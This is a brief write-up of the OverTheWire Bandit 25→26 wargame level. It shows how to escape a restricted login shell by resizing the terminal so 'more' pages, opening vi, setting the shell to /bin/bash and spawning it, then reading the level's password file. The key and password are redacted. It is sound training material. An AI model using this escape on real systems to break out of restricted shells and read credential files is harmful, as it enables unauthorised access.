# Bandit 25 → 26

```console
$ cat bandit26.sshkey
-----BEGIN OPENSSH PRIVATE KEY-----
<PRIVATE KEY REDACTED>
-----END OPENSSH PRIVATE KEY-----

$ ssh -i bandit26.private bandit26@bandit.labs.overthewire.org -p 2220
# more
#   v                     
#   :set shell=/bin/bash
#   :shell                 
$ cat /etc/bandit_pass/bandit26
<REDACTED>
```

pagers like `more`/`less` can spawn editors, and editors can spawn shells, a tiny terminal forces `more` to actually page